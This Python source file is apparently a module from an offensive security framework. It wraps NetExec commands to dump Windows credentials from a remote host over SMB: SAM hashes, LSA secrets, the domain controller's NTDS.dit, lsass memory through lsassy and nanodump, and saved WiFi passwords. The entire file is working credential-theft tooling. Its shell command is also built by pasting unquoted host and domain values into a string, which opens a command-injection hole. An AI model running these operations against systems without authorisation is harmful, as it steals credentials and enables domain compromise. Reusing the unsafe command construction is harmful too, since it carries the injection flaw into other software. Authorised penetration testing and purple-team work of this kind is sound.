"""
SMB Credentials Module

Dump credentials including SAM, LSA, NTDS, and memory credentials.
"""

from purplesploit.core.module import ExternalToolModule
from typing import Dict, Any, List


class SMBCredentialsModule(ExternalToolModule):
    """SMB credential dumping operations."""

    def __init__(self, framework):
        super().__init__(framework)
        self.tool_name = "nxc"

    @property
    def name(self) -> str:
        return "SMB Credentials"

    @property
    def description(self) -> str:
        return "SMB credential dumping and extraction"

    @property
    def author(self) -> str:
        return "PurpleSploit Team"

    @property
    def category(self) -> str:
        return "smb"

    def _init_options(self):
        """Initialize module-specific options."""
        super()._init_options()

        self.options.update({
            "RHOST": {
                "value": None,
                "required": True,
                "description": "Target host IP address or hostname",
                "default": None
            },
            "USERNAME": {
                "value": None,
                "required": False,
                "description": "Username for authentication",
                "default": None
            },
            "PASSWORD": {
                "value": None,
                "required": False,
                "description": "Password for authentication",
                "default": None
            },
            "DOMAIN": {
                "value": None,
                "required": False,
                "description": "Domain name",
                "default": "WORKGROUP"
            },
        })

    def get_operations(self) -> List[Dict[str, Any]]:
        """Get list of credential dumping operations."""
        return [
            {"name": "Dump SAM Database", "description": "Dump SAM hashes (local users)", "handler": "op_dump_sam"},
            {"name": "Dump LSA Secrets", "description": "Dump LSA secrets", "handler": "op_dump_lsa"},
            {"name": "Dump NTDS (DC Only)", "description": "Dump NTDS.dit from Domain Controller", "handler": "op_dump_ntds"},
            {"name": "Dump All (SAM+LSA+NTDS)", "description": "Dump everything", "handler": "op_dump_all"},
            {"name": "Lsassy (Memory Dump)", "description": "Dump credentials from lsass memory", "handler": "op_lsassy"},
            {"name": "Nanodump", "description": "Nanodump lsass", "handler": "op_nanodump"},
            {"name": "WiFi Passwords", "description": "Extract WiFi passwords", "handler": "op_wifi"},
        ]

    def _build_auth(self) -> str:
        """Build authentication string for nxc."""
        username = self.get_option("USERNAME")
        password = self.get_option("PASSWORD")

        if not username:
            return ""

        auth = f"-u '{username}'"
        if password:
            auth += f" -p '{password}'"
        else:
            auth += " -p ''"

        return auth

    def _execute_nxc(self, extra_args: str = "") -> Dict[str, Any]:
        """Execute nxc smb command."""
        rhost = self.get_option("RHOST")
        domain = self.get_option("DOMAIN")
        auth = self._build_auth()

        cmd = f"nxc smb {rhost} {auth}"

        if domain and domain != "WORKGROUP":
            cmd += f" -d {domain}"

        if extra_args:
            cmd += f" {extra_args}"

        return self.execute_command(cmd, timeout=300)

    def op_dump_sam(self) -> Dict[str, Any]:
        """Dump SAM database."""
        return self._execute_nxc("--sam")

    def op_dump_lsa(self) -> Dict[str, Any]:
        """Dump LSA secrets."""
        return self._execute_nxc("--lsa")

    def op_dump_ntds(self) -> Dict[str, Any]:
        """Dump NTDS from Domain Controller."""
        self.log("This operation is for Domain Controllers only", "warning")
        self.log("This may take a while on large domains...", "info")
        return self._execute_nxc("--ntds")

    def op_dump_all(self) -> Dict[str, Any]:
        """Dump everything (SAM+LSA+NTDS)."""
        return self._execute_nxc("--sam --lsa --ntds")

    def op_lsassy(self) -> Dict[str, Any]:
        """Dump credentials from lsass memory."""
        return self._execute_nxc("-M lsassy")

    def op_nanodump(self) -> Dict[str, Any]:
        """Nanodump lsass."""
        return self._execute_nxc("-M nanodump")

    def op_wifi(self) -> Dict[str, Any]:
        """Extract WiFi passwords."""
        return self._execute_nxc("-M wifi")

    def run(self) -> Dict[str, Any]:
        """Default run - dump SAM."""
        return self.op_dump_sam()
